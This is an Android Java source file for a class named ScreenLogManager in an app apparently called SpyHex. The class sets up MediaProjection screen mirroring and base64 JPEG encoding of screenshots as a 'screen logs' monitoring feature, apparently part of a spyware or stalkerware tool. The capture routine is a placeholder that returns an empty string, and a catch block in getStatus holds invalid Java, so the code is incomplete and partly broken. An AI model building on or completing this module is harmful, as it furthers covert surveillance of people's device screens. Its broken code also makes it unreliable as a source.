package com.spyhex.app.features.screenlogs;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import com.spyhex.app.core.SpyHexApp;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class ScreenLogManager {
    private static ScreenLogManager instance;
    private final Context ctx;
    private boolean isMonitoring = false;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Handler handler;

    private ScreenLogManager() {
        this.ctx = SpyHexApp.getContext();
        this.handler = new Handler(Looper.getMainLooper());
    }

    public static synchronized ScreenLogManager getInstance() {
        if (instance == null) instance = new ScreenLogManager();
        return instance;
    }

    public void startMonitoring() {
        if (isMonitoring) return;
        isMonitoring = true;
        // Requires MediaProjection permission — will be requested via intent
        // For now, set flag to capture on next projection grant
    }

    public void stopMonitoring() {
        isMonitoring = false;
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
    }

    public void capture(ScreenCaptureCallback callback) {
        // Capture using MediaProjection if available
        // Fallback: capture current app view only
        new Thread(() -> {
            try {
                // Placeholder: in real impl, use MediaProjection from granted permission
                JSONObject r = new JSONObject();
                r.put("type", "screen_capture");
                r.put("status", isMonitoring ? "monitoring" : "single_capture");
                r.put("timestamp", System.currentTimeMillis());
                new Handler(Looper.getMainLooper()).post(() -> callback.onCapture(""));
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    public void setMediaProjection(MediaProjection mp) {
        this.mediaProjection = mp;
        if (isMonitoring && mp != null) {
            setupVirtualDisplay();
        }
    }

    private void setupVirtualDisplay() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return;
        WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        wm.getDefaultDisplay().getMetrics(metrics);
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        int density = metrics.densityDpi;

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        virtualDisplay = mediaProjection.createVirtualDisplay("SpyHexScreen",
            width, height, density, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader.getSurface(), null, handler);
    }

    private String encodeImage(Image image) {
        try {
            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int rowPadding = rowStride - pixelStride * image.getWidth();
            Bitmap bitmap = Bitmap.createBitmap(
                image.getWidth() + rowPadding / pixelStride,
                image.getHeight(), Bitmap.Config.ARGB_8888);
            bitmap.copyPixelsFromBuffer(buffer);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
            return Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT);
        } catch (Exception e) {
            return "";
        }
    }

    public boolean isMonitoring() { return isMonitoring; }

    public JSONObject getStatus() {
        JSONObject s = new JSONObject();
        try {
            s.put("monitoring", isMonitoring);
            s.put("hasProjection", mediaProjection != null);
            s.put("ready", true);
        } catch (Exception e) { android.util.Log.e("SpyHex", "Error: " + Exception e.getMessage()); }
        return s;
    }

    public interface ScreenCaptureCallback {
        void onCapture(String base64Screenshot);
    }
}
